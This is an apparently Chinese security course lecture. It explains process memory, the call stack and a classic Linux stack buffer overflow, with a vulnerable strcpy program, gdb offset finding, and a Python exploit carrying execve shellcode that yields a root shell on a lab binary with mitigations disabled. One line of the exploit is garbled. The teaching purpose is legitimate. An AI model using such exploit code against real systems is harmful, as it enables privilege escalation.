# 第13讲 Linux攻击入门

本讲主要内容：
- 栈溢出漏洞攻击


## 栈溢出漏洞攻击

缓冲区溢出攻击是最为严重的一类系统攻击方式。

![buffer-overflow-attacks](images/13/buffer-overflow-attacks.png)

### 缓冲区基础

缓冲区溢出就是在内存数据复制过程中，没有良好的检查机制，导致原先设定的存储区不足以存放数据的现象。

缓冲区溢出攻击就是利用缓冲区溢出，引发非法程序执行的攻击过程。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码， 最终获得主机的控制权。

不同的操作系统，一个进程可能被分配到不同的内存区域去执行。但内存都可以按照功能大致分成以下 4 个部分。 
- 代码区
  - 这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并 执行。 
- 数据区
  - 用于存储全局变量等。
- 堆区：
  - 进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。 
- 栈区
  - 用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。 

在 Windows 平台下，高级语言写出的程序经过编译链接，最终会变成 PE 文件。当 PE 文件被装载运行后，就成了"进程"。

<img src="images\12\进程内存使用示意图.png" width="480"  alt="进程内存使用示意图"   />

而在 Linux 平台下，高级语言写出的程序经过编译链接，最终会变成 ELF 文件。 ELF 文件被装载运行后，也会变成了"进程"。


如果把计算机看成一个有条不紊的工厂，我们可以得到如下类比。 
- CPU 是完成工作的工人。  
- 数据区、堆区、栈区等则是用来存放原料、半成品、成品等各种东西的场所。 
- 存在代码区的指令则告诉 CPU 要做什么，怎么做，到哪里去领原材料，用什么工具来做，做完以后把成品放到哪个货舱去。  
- 值得一提的是，栈除了扮演存放原料、半成品的仓库之外，它还是车间调度主任的办公室。 
- 程序中所使用的缓冲区可以是堆区、栈区和存放静态变量的数据区。
- 缓冲区溢出的利用方法和缓冲区到底属于上面哪个内存区域密不可分。

从计算机科学的角度来看，栈指的是一种数据结构，是一种先进后出的数据表。栈的最常见操作有两种：
- 压栈（PUSH）
- 弹栈（POP）；

用于标识栈的属性也有两个：
- 栈顶（TOP）
- 栈底（BASE）

可以把栈想象成一摞扑克牌。  
- PUSH：为栈增加一个元素的操作叫做 PUSH，相当于在这摞扑克牌的最上面再放上 一张。 
- POP：从栈中取出一个元素的操作叫做 POP，相当于从这摞扑克牌取出最上面的一张。
- TOP：标识栈顶位置，并且是动态变化的。每做一次 PUSH 操作，它都会自增 1；相反，每做一次 POP 操作，它会自减 1。栈顶元素相当于扑克牌最上面一张，只有这张 牌的花色是当前可以看到的。  
- BASE：标识栈底位置，它记录着扑克牌最下面一张的位置。BASE 用于防止栈空后继 续弹栈（牌发完时就不能再去揭牌了）。很明显，一般情况下，BASE 是不会变动的。

- 内存的栈区实际上指的就是系统栈。系统栈由系统自动维护，它用于实现高级语言中函数 的调用。
- 对于类似 C 语言这样的高级语言，系统栈的 PUSH、POP 等堆栈平衡细节是透明的。 一般说来，只有在使用汇编语言开发程序的时候，才需要和它直接打交道。 

我们下面就来探究一下高级语言中函数的调用和递归等性质是怎样通过系统栈巧妙实现 的。请看如下代码： 

```C
intfunc_B(int arg_B1, int arg_B2)
{        
    int var_B1, var_B2;         
    var_B1=arg_B1+arg_B2;         var_B2=arg_B1-arg_B2;         
    return var_B1*var_B2; 
} 
 
intfunc_A(int arg_A1, int arg_A2) 
{         
    int var_A;         
    var_A = func_B(arg_A1,arg_A2) + arg_A1 ;         return var_A; 
} 
 
int main(int argc, char **argv, char **envp) 
{         
    int var_main;         
    var_main=func_A(4,3); 
    return var_main;     
} 
```
这段代码经过编译器编译后，各个函数对应的机器指令在代码区中可能是这样分布的，如下图所示。 

<img src="images\12\函数代码在代码区中的分布示意图.png" width="480"  alt="进程内存使用示意图"   />


根据操作系统的不同、编译器和编译选项的不同，同一文件不同函数的代码在内存代码区中的分布可能相邻，也可能相离甚远，可能先后有序，也可能无序；但它们都在同一个 PE 文件的代码所映射的一个“节”里。

我们可以简单地把它们在内存代码区中的分布位置理解成是散乱无关的。 

当 CPU 在执行调用 func_A 函数的时候，会从代码区中 main 函数对应的机器指令的区域跳转到 func_A 函数对应的机器指令区域，在那里取指并执行；

当 func_A 函数执行完闭，需要 返回的时候，又会跳回到 main 函数对应的指令区域，紧接着调用 func_A 后面的指令继续执行 main 函数的代码。

在这个过程中，CPU 的取指轨迹如下图所示。 

<img src="images\12\CPU在代码区中的取指令轨迹示意图.png" width="480"  alt="进程内存使用示意图"   />

那么 CPU 是怎么知道要去 func_A 的代码区取指，在执行完 func_A 后又是怎么知道跳回 到 main 函数（而不是 func_B 的代码区）的呢？

这些跳转地址我们在 C 语言中并没有直接说明， CPU 是从哪里获得这些函数的调用及返回的信息的呢？

原来，这些代码区中精确的跳转都是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所 属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。 

在函数调用的过程中，伴随的系统栈中的操作如下：

- 在 main 函数调用 func_A 的时候，首先在自己的栈帧中压入函数返回地址，然后为 func_A 创建新栈帧并压入系统栈。 
- 在 func_A 调用 func_B 的时候，同样先在自己的栈帧中压入函数返回地址，然后为 func_B 创建新栈帧并压入系统栈。  
- 在 func_B 返回时，func_B 的栈帧被弹出系统栈，func_A 栈帧中的返回地址被“露” 在栈顶，此时处理器按照这个返回地址重新跳到 func_A 代码区中执行。 
-  在 func_A 返回时，func_A 的栈帧被弹出系统栈，main 函数栈帧中的返回地址被“露” 在栈顶，此时处理器按照这个返回地址跳到 main 函数代码区中执行。 


缓冲区溢出的常见形式有两类：
- 堆栈(Stack)缓冲区溢出
- 堆（Heap）缓冲区溢出

### 堆栈缓冲区溢出

让我们看看缓冲区溢出攻击的代码！

先看漏洞代码(vuln.c)：

```C
//vuln.c
#include <stdio.h>
#include <string.h>
int main(int argc, char* argv[]) {
        /* [1] */ char buf[256];
        /* [2] */ strcpy(buf,argv[1]);
        /* [3] */ printf("Input:%s\n",buf);
        return 0;
}
```

将上述代码编译：

```Shell
# echo 0 > /proc/sys/kernel/randomize_va_space
$ gcc -g -fno-stack-protector -z execstack -o vuln vuln.c
$ sudo chown root vuln
$ sudo chgrp root vuln
$ sudo chmod +s vuln
```
上述漏洞代码的[2]行是可能引发缓冲区溢出的地方。这个bug可能导致任意代码执行。那么问题来了：如何执行任意代码？

#### 如何执行任意代码执行？

早期，黑客们使用称为 “ 返回地址覆盖 ” 的技术实现任意代码执行。攻击者使用精心设计的代码地址替换用户堆栈区中的“函数返回地址”。

例如上面例子中调用strcpy后会返回main函数，黑客可以在strcpy函数后，使用自己函数的地址替换main函数地址，从而导致任意代码执行。

在研究漏洞代码之前，为了更好的理解，让我们反汇编并且绘制出漏洞代码的堆栈布局。反汇编结果如下：

```Shell
(gdb) disassemble main
Dump of assembler code for function main:
   //Function Prologue
   0x08048414 <+0>:push   %ebp                      //backup caller's ebp
   0x08048415 <+1>:mov    %esp,%ebp                 //set callee's ebp to esp
   0x08048417 <+3>:and    $0xfffffff0,%esp          //栈对齐
   0x0804841a <+6>:sub    $0x110,%esp               //stack space for local variables
   0x08048420 <+12>:mov    0xc(%ebp),%eax            //eax = argv
   0x08048423 <+15>:add    $0x4,%eax                 //eax = &argv[1]
   0x08048426 <+18>:mov    (%eax),%eax               //eax = argv[1]
   0x08048428 <+20>:mov    %eax,0x4(%esp)            //strcpy arg2 
   0x0804842c <+24>:lea    0x10(%esp),%eax           //eax = 'buf' 
   0x08048430 <+28>:mov    %eax,(%esp)               //strcpy arg1
   0x08048433 <+31>:call   0x8048330 <strcpy@plt>    //call strcpy
   0x08048438 <+36>:mov    $0x8048530,%eax           //eax = format str "Input:%s\n"
   0x0804843d <+41>:lea    0x10(%esp),%edx           //edx = buf
   0x08048441 <+45>:mov    %edx,0x4(%esp)            //printf arg2
   0x08048445 <+49>:mov    %eax,(%esp)               //printf arg1
   0x08048448 <+52>:call   0x8048320 <printf@plt>    //call printf
   0x0804844d <+57>:mov    $0x0,%eax                 //return value 0
   //Function Epilogue
   0x08048452 <+62>:leave                            //mov ebp, esp; pop ebp; 
   0x08048453 <+63>:ret                              //return
End of assembler dump.
(gdb)
```
堆栈布局：

![mainstacklayout](images/13/mainstacklayout.png)


当用户输入字符串大于256个字节时，溢出就会发生并覆盖了堆栈中存储的返回地址。这通过发送一系列A来测试它。

##### 测试步骤1：是否可以覆盖返回地址？

```Shell
$ gdb -q vuln
Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.
(gdb) r `python -c 'print "A"*300'`
Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*300'`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) p/x $eip
$1 = 0x41414141
(gdb)
```

以上输出显示指令指针寄存器（EIP）被AAAA覆盖，这样可以确定覆盖返回地址是可能的！

##### 测试步骤2：目的缓冲区的偏移量是多少？

这里让我们找出返回地址相对与目的缓冲区buf的偏移量。在反汇编并绘制了main的堆栈布局后，现在可以尝试找到偏移位置信息！

堆栈布局显示返回地址位于距目标缓冲区buf的偏移（0x10c）处。0x10c计算如下：

0x10c = 0x100 + 0x8 + 0x4

其中:
- 0x100 is ‘buf’ 大小
- 0x8 is 对齐空间    //这里有点不太明白为啥需要对齐
- 0x4 is 调用者的ebp

因此，用户输入的 "A" * 268 + "B" * 4，覆盖了buf，对齐空间和调用者的ebp覆盖为A并且返回地址变为BBBB。

```Shell
$ gdb -q vuln
Reading symbols from /home/sploitfun/lsploits/new/csof/vuln...done.
(gdb) r `python -c 'print "A"*268 + "B"*4'`
Starting program: /home/sploitfun/lsploits/new/csof/vuln `python -c 'print "A"*268 + "B"*4'`
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) p/x $eip
$1 = 0x42424242
(gdb)
```

以上输出显示攻击者可以控制返回地址。 位于堆栈位置（0xbffff1fc）的返回地址被BBBB覆盖。 有了这些信息，我们可以编写一个漏洞利用程序来实现任意的代码执行。

##### 测试步骤3：使用攻击代码

攻击代码：

```Python
#exp.py 
#!/usr/bin/env python
import struct
from subprocess import call
#Stack address where shellcode is copied.
ret_addr = 0xbffff1d0       

#Spawn a shell
#execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
#endianess convertion
def conv(num):
 return struct.pack("<I",numnk + RA + NOP's + Shellcode
buf = "A" * 268
buf += conv(ret_addr)
buf += "\x90" * 100
buf += scode
print "Calling vulnerable program"
call(["./vuln", buf])
```

执行上面的exploit程序，给了我们root shell，如下所示：

>注意：为了获得这个root shell，需要关闭了许多漏洞利用缓解技术。
```Shell
$ python exp.py 
Calling vulnerable program
Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��S���
# id
uid=1000(sploitfun) gid=1000(sploitfun) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare),1000(sploitfun)
# exit
$
```

## 参考资料

1. https://wizardforcel.gitbooks.io/sploitfun-linux-x86-exp-tut/1.html
2. https://www.freebuf.com/column/176154.html
3. https://github.com/JnuSimba/LinuxSecNotes